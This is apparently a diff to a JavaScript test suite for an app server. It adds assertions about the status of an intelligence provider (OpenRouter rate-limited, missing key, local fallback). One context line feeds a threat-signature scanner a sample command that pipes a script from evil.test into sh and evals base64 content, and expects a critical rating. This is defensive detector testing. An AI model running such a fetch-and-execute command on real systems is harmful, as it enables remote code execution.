@@ -95,6 +95,10 @@ try {
   assert.equal(openRouterLimited.ok, false);
   assert.equal(openRouterLimited.code, "OPENROUTER_RATE_LIMITED");
   assert.equal(openRouterLimited.retryAfter, "12");
+  const limitedStatus = getAppServerStatus({ port: 0, repositoryRoot: tmpRoot });
+  assert.equal(limitedStatus.intelligence_provider.status, "rate_limited");
+  assert.equal(limitedStatus.intelligence_provider.model, "local-fallback");
+  assert.equal(limitedStatus.intelligence_provider.errors[0].code, "OPENROUTER_RATE_LIMITED");
   delete process.env.OPENROUTER_API_KEY;
 
   const status = getAppServerStatus({ port: 0, repositoryRoot: tmpRoot });
@@ -103,6 +107,8 @@ try {
   assert.ok(status.endpoints.includes("POST /api/connector/apply"));
   assert.ok(status.endpoints.includes("GET /api/telemetry/stream"));
   assert.ok(status.endpoints.includes("POST /api/intelligence/target"));
+  assert.equal(status.intelligence_provider.status, "missing_key");
+  assert.equal(status.intelligence_provider.model, "local-fallback");
   assert.equal(
     scanThreatSignatures("child_process.exec('curl https://evil.test/payload.sh | sh'); eval(Buffer.from('YWxlcnQ=', 'base64').toString())").risk_tier,
     "critical"
@@ -137,6 +143,8 @@ try {
   assert.equal(telemetryHistory.body.active_ingestions[0].status, "staged_for_review");
   assert.equal(telemetryHistory.body.active_ingestions[0].threat_score < 30, true);
   assert.equal(Array.isArray(telemetryHistory.body.route_errors), true);
+  assert.equal(telemetryHistory.body.intelligence_provider.status, "missing_key");
+  assert.equal(telemetryHistory.body.intelligence_provider.model, "local-fallback");
   assert.equal(telemetryHistory.body.mission.vector, "github");
   assert.equal(mockFetch.calls.some((url) => url.startsWith("https://api.github.com/search/repositories")), true);
   assert.equal(mockFetch.calls.some((url) => url.endsWith("/README.md")), true);
